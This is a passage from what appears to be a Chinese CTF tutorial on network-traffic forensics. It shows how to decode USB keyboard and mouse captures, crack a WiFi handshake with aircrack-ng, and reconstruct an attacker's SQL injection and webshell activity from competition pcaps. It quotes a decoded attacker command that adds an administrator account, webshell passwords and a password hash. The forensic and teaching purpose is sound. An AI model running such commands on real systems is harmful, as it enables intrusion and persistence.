进行密码的暴力破解，破解成功，然后干了些猥琐的事情的过程</p><p>我们需要找到黑客扫描到的 管理员入口的地址 并找到他破解出admin 的密码</p><h3 id="六，usb流量分析"><a href="#六，usb流量分析" class="headerlink" title="六，usb流量分析"></a><strong>六，usb流量分析</strong></h3><p>usb流量分析，包括usb键盘流量，usb鼠标流量</p><p>键盘流量数据为 8个字节</p><p>鼠标流量数据为 4个字节 （具体每个字节代表些啥，自行百度）</p><p><em><strong>*例6.1：usb流量分析*</strong></em></p><p>打开流量包：看到的确是usb流量，并且没有杂包（如果有不是usb的包需提前滤除掉）</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688820.jpeg" alt="img"></p><p>把这个包放进linux中提取数据：</p><pre><code class="r">tshark -r example.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></pre><p>然后就得到了 usbdata.txt文件：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688821.jpeg" alt="img"></p><p>看到每行为8个字节，确定是 键盘流量数据，</p><p>然后用脚本进行处理得到flag：</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;: &quot;a&quot;, &quot;05&quot;: &quot;b&quot;, &quot;06&quot;: &quot;c&quot;, &quot;07&quot;: &quot;d&quot;, &quot;08&quot;: &quot;e&quot;, &quot;09&quot;: &quot;f&quot;, &quot;0a&quot;: &quot;g&quot;, &quot;0b&quot;: &quot;h&quot;, &quot;0c&quot;: &quot;i&quot;,              &quot;0d&quot;: &quot;j&quot;, &quot;0e&quot;: &quot;k&quot;, &quot;0f&quot;: &quot;l&quot;, &quot;10&quot;: &quot;m&quot;, &quot;11&quot;: &quot;n&quot;, &quot;12&quot;: &quot;o&quot;, &quot;13&quot;: &quot;p&quot;, &quot;14&quot;: &quot;q&quot;, &quot;15&quot;: &quot;r&quot;,              &quot;16&quot;: &quot;s&quot;, &quot;17&quot;: &quot;t&quot;, &quot;18&quot;: &quot;u&quot;, &quot;19&quot;: &quot;v&quot;, &quot;1a&quot;: &quot;w&quot;, &quot;1b&quot;: &quot;x&quot;, &quot;1c&quot;: &quot;y&quot;, &quot;1d&quot;: &quot;z&quot;, &quot;1e&quot;: &quot;1&quot;,              &quot;1f&quot;: &quot;2&quot;, &quot;20&quot;: &quot;3&quot;, &quot;21&quot;: &quot;4&quot;, &quot;22&quot;: &quot;5&quot;, &quot;23&quot;: &quot;6&quot;, &quot;24&quot;: &quot;7&quot;, &quot;25&quot;: &quot;8&quot;, &quot;26&quot;: &quot;9&quot;, &quot;27&quot;: &quot;0&quot;,              &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;-&quot;, &quot;2e&quot;: &quot;=&quot;, &quot;2f&quot;: &quot;[&quot;,              &quot;30&quot;: &quot;]&quot;, &quot;31&quot;: &quot;\\&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;;&quot;, &quot;34&quot;: &quot;&#39;&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;,&quot;, &quot;37&quot;: &quot;.&quot;, &quot;38&quot;: &quot;/&quot;,              &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,              &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125; shiftKeys = &#123;&quot;04&quot;: &quot;A&quot;, &quot;05&quot;: &quot;B&quot;, &quot;06&quot;: &quot;C&quot;, &quot;07&quot;: &quot;D&quot;, &quot;08&quot;: &quot;E&quot;, &quot;09&quot;: &quot;F&quot;, &quot;0a&quot;: &quot;G&quot;, &quot;0b&quot;: &quot;H&quot;, &quot;0c&quot;: &quot;I&quot;,             &quot;0d&quot;: &quot;J&quot;, &quot;0e&quot;: &quot;K&quot;, &quot;0f&quot;: &quot;L&quot;, &quot;10&quot;: &quot;M&quot;, &quot;11&quot;: &quot;N&quot;, &quot;12&quot;: &quot;O&quot;, &quot;13&quot;: &quot;P&quot;, &quot;14&quot;: &quot;Q&quot;, &quot;15&quot;: &quot;R&quot;,             &quot;16&quot;: &quot;S&quot;, &quot;17&quot;: &quot;T&quot;, &quot;18&quot;: &quot;U&quot;, &quot;19&quot;: &quot;V&quot;, &quot;1a&quot;: &quot;W&quot;, &quot;1b&quot;: &quot;X&quot;, &quot;1c&quot;: &quot;Y&quot;, &quot;1d&quot;: &quot;Z&quot;, &quot;1e&quot;: &quot;!&quot;,             &quot;1f&quot;: &quot;@&quot;, &quot;20&quot;: &quot;#&quot;, &quot;21&quot;: &quot;$&quot;, &quot;22&quot;: &quot;%&quot;, &quot;23&quot;: &quot;^&quot;, &quot;24&quot;: &quot;&amp;&quot;, &quot;25&quot;: &quot;*&quot;, &quot;26&quot;: &quot;(&quot;, &quot;27&quot;: &quot;)&quot;,             &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;_&quot;, &quot;2e&quot;: &quot;+&quot;, &quot;2f&quot;: &quot;&#123;&quot;,             &quot;30&quot;: &quot;&#125;&quot;, &quot;31&quot;: &quot;|&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;\&quot;&quot;, &quot;34&quot;: &quot;:&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;&lt;&quot;, &quot;37&quot;: &quot;&gt;&quot;, &quot;38&quot;: &quot;?&quot;,             &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,             &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;usbdata.txt&#39;)for line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close() flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><strong>例6.2 usb流量</strong></p><p>打开发现有大量的usb协议的流量包，不过其中有很多的杂包，</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688822.jpeg" alt="img"></p><p>发现其中有一大段是 4个字节的 usb数据（鼠标数据）</p><p>先将这些鼠标流量的包过滤出来，</p><p>usb.src &#x3D;&#x3D; “2.3.1”  过滤后，文件 》导出特殊分组 》保存为 jjj.pcap</p><p>把jjj.pcap放进linux中：</p><pre><code class="r">tshark -r  jjj.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></pre><p>生成usbdata.txt文件，然后将usbdata.txt中的鼠标流量数据转换为坐标</p><pre><code class="python">nums = []keys = open(&#39;usbdata.txt&#39;,&#39;r&#39;)file = open(&#39;xy.txt&#39;,&#39;w&#39;)posx = 0posy = 0for line in keys:    if len(line) != 12 :         continue    x = int(line[3:5],16)    y = int(line[6:8],16)    if x &gt; 127 :        x -= 256    if y &gt; 127 :        y -= 256    posx += x    posy += y    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing    if btn_flag == 1 :        string = str(posx) + &#39; &#39;+str(posy) +&#39;\n&#39;        file.write(string)keys.close()file.close()</code></pre><p>生成了xy.txt文件：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688823.jpeg" alt="img"></p><p>然后在linux中 执行</p><pre><code class="erlang">gnuplot&gt;plot &quot;xy.txt&quot;</code></pre><p>就得到了用鼠标画的图了：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688824.jpeg" alt="img"></p><h3 id="七，WiFi无线密码破解"><a href="#七，WiFi无线密码破解" class="headerlink" title="七，WiFi无线密码破解"></a><strong>七，WiFi无线密码破解</strong></h3><p><strong>例7.1题目：想蹭网先解开密码(无线密码破解)</strong></p><p>题目来源：bugku<br>考点：无线密码破解<br>题目信息：(wifi.cap)</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688825.png" alt="img"></p><p>wifi 连接认证 的重点在于 WAP的 四次握手过程 ，就是 EAPOL 协议的包，</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688826.png" alt="img"></p><p>存在 握手过程：直接进行爆破：</p><p>先用 linux中的 crunch 生成一个字典：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219161515651.jpg" alt="img"></p><p>然后 用 aircrack-ng 进行爆破：<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688827.jpeg" alt="img"></p><p>得到 WiFi密码：13910407686</p><h3 id="八，根据一组流量包了解黑客的具体行为"><a href="#八，根据一组流量包了解黑客的具体行为" class="headerlink" title="八，根据一组流量包了解黑客的具体行为"></a><strong>八，根据一组流量包了解黑客的具体行为</strong></h3><p>参考：<a href="https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/%EF%BC%88%E6%83%B3%E8%A6%81%E4%B8%8B%E9%9D%A2%E4%BE%8B%E5%AD%90%E6%BA%90%E6%96%87%E4%BB%B6%E7%9A%84%E5%8E%BB%E7%9C%8B%E7%9C%8B%EF%BC%89">https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/（想要下面例子源文件的去看看）</a></p><p><strong>例8.1 （1.pcap）</strong></p><p>2018信息安全铁人三项数据赛</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219203655300.jpg" alt="img"></p><p>打开流量包，流量包有点大，打开比较慢，这里我们先过滤为HTTP协议可以看到<code>202.1.1.2</code>对<code>192.168.1.8</code>进行了疯狂的爆破</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688928.jpeg" alt="img"></p><p>不难看出，黑客利用的SqlMap在对目标站点进行不断的SQL试探注入<br><strong>因此受害主机的网卡IP地址为*<em><code>192.168.1.8</code>*</em><br>而注入的参数也可以清晰的看见，为*<em><code>list[select]</code>*</em></strong></p><p>追踪http流，根据回显内容，目标站点数据库抛出的错误，可以清晰的看见</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688929.jpeg" alt="img"></p><p>不难确定，目标站点的数据库表名前缀为**<code>ajtuc_</code>**</p><p>接着为了确定受害主机网站数据库的名字，再进行了一次过滤</p><pre><code class="lisp">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</code></pre><p>此时挑选最后一次注入的payload进行url解码</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/2019121920424782.jpg" alt="img"></p><p>可以清楚的看到</p><pre><code class="css">FROM joomla.ajtuc_users</code></pre><p>因此数据库名为**<code>joomla</code>**</p><p>所以答案：</p><pre><code class="scss">1.黑客攻击的第一个受害主机的网卡IP地址 192.168.1.82.黑客对URL的哪一个参数实施了SQL注入list[select]3.第一个受害主机网站数据库的表前缀(加上下划线例如abc_)ajtuc_4.第一个受害主机网站数据库的名字joomla</code></pre><p><strong>例8.2(2.pcap)</strong></p><p>题目来源：2018信息安全铁人三项数据赛</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219204430496.jpg" alt="img"></p><p>根据题目一已确定目标ip，所以依旧使用以下过滤简化操作</p><pre><code class="lisp">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</code></pre><p>可以看到一个奇怪文件<code>kkkaaa.php</code>,跟进POST数据查看</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688930.jpeg" alt="img"></p><p>不难发现，是中国菜刀的流量,木马密码为**<code>zzz</code>**<br>接着确定黑客第二次上传php木马的时间<br>我进行了过滤，猜想黑客应该是根据第一个木马来上传的第二个木马</p><pre><code class="vbscript">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST</code></pre><p>此时一条数据格外引人注目</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688931.jpeg" alt="img"></p><p>我们对其16进制进行分析</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688932.jpeg" alt="img"></p><p>将保存的值放入winhex中得到源码</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688933.jpeg" alt="img"></p><p>将文件保存为php,但是代码经过混淆过的，在代码末尾加上下面两句代码</p><pre><code class="scss">var_dump($j);var_dump($x);</code></pre><p>运行php进行解混淆，发现这就是木马</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030688934.jpeg" alt="img"></p><p>由此可确定这个引人注目的包上传了第二个木马<br>因此上传时间为:<code>17:20:44.248365</code></p><p>还是使用过滤</p><pre><code class="lisp">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</code></pre><p>然后可以看到许多请求footer.php的页面，点开一个查看详情</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219211732928.jpg" alt="img"></p><p>容易发现referer数据十分可疑，而ACCEPT_LANGUAGE较为正常<br>所以可以基本确定，木马通过HTTP协议中的**<code>Referer</code>**头传递数据</p><p>答案</p><pre><code class="undefined">1.黑客第一次获得的php木马的密码是什么zzz2.黑客第二次上传php木马是什么时间17:20:44.2483653.第二次上传的木马通过HTTP协议中的哪个头传递数据Referer</code></pre><p><em><strong>*例.8.3(3.pcap)*</strong></em></p><p>题目来源：2018信息安全铁人三项数据赛</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/20191219212845108.jpg" alt="img"></p><p>直接进行过滤</p><pre><code class="sql">tcp contains &quot;mysql&quot; &amp;&amp; mysql</code></pre><p>得到大量数据，可以发现黑客应该在对Mysql的登录进行爆破，内网受害机器为192.168.2.20</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689035.jpeg" alt="img"></p><p>我们找到最后一条登录数据</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689036.jpeg" alt="img"></p><p>该值就为我们需要的mysql密码hash了</p><p>简单过滤一下</p><pre><code class="lisp">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689037.jpeg" alt="img"></p><p>目标机器已经被挂上了tunnel.php，方便外网对内网的访问<br>为方便查看黑客操作，我们过滤出POST请求</p><pre><code class="vbscript">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==POST &amp;&amp; http</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689038.jpeg" alt="img"></p><p>我们清晰的看见黑客的php代理第一次使用时最先连接4.2.2.2这个ip,并且端口为53</p><p>答案</p><pre><code class="bash">1.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c42.php代理第一次被使用时最先连接了哪个IP地址4.2.2.2</code></pre><p><em><strong>*例8.4（4.pcap)*</strong></em></p><p>题目来源：2018信息安全铁人三项数据赛</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/201912192139196.jpg" alt="img"></p><p>为确定黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候，我们继续进行过滤</p><pre><code class="lisp">(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; (http contains &quot;dir&quot; || http contains &quot;ls&quot;)</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689039.jpeg" alt="img"></p><p>此时一条为ls，一条为dir，我们先对ls的进行验证<br>追踪其tcp流<br><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689040.jpeg" alt="img"></p><p>发现并没有执行成功,再对dir进行验证</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689041.jpeg" alt="img"></p><p>于是可以确定无误，目标系统为windows，同时dir命令执行成功<br>时间为：<code>18:37:38.482420</code><br>既然该192.168.2.20的机器可以执行命令，于是我改变过滤方式，查看黑客如何进行攻击</p><pre><code class="undefined">ip.addr == 192.168.2.20 &amp;&amp; http</code></pre><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689042.jpeg" alt="img"></p><p>可以看到上面几条受害机器分别执行了 dir ，pwd，dir，以及echo%20…..等命令</p><p>不难发现,黑客利用echo命令写入了一个名为sh.php的后门</p><p>然后往下翻看到黑客利用这个后门post 了一些东西，猜测应该是木马文件，看一下：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689143.jpeg" alt="img"></p><p>果然，木马的密码是123，是中国菜刀的流量</p><p>我们进一步跟进黑客执行的指令，由于是中国菜刀流量，我们选择根据回显明文，猜测指令，这样更有效率</p><pre><code class="undefined">ip.src == 192.168.2.20 &amp;&amp; http</code></pre><p>在18:50:09.344660时，我们发现可疑操作,我们发现一条可疑数据，判断黑客应该是执行了<code>net user</code>的命令</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689144.jpeg" alt="img"></p><p>然后在18:50:42.908737发现黑客再次执行了net user命令<br>此时回显为：</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689145.jpeg" alt="img"></p><p>看来黑客成功添加了管理员用户kaka<br>确定了大致的作案时间，我们即可使用过滤</p><p>确定了大致的作案时间，我们即可使用过滤</p><pre><code class="undefined">ip.addr == 192.168.2.20 &amp;&amp; http</code></pre><p>根据之前的判断，我们可以知道<br>18:49:27.767754时，不存在kaka用户</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689146.jpeg" alt="img"><br>18:50:42.908737时，kaka用户已成为管理员<br>所以可以断定作案时间点在这段时间内</p><p>在此期间，一共4个POST请求，我们挨个查看，果不其然，在第一个POST中就发现了问题</p><pre><code class="undefined">Y2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIga2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=</code></pre><p>解码后</p><pre><code class="sql">cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code></pre><p>可以明显看到</p><pre><code class="sql">net user kaka kaka /add</code></pre><p>于是可以断定，用户名和密码均为<code>kaka</code><br>最后一题既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p><pre><code class="vbscript">ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST</code></pre><p>然后我们在数据包的最后发现如下数据</p><p><img src="/../pic/CTF%E2%80%94%E2%80%94MISC%E2%80%94%E2%80%94%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70-166857030689147.jpeg" alt="img"></p><p>我们将其解码</p><p><img 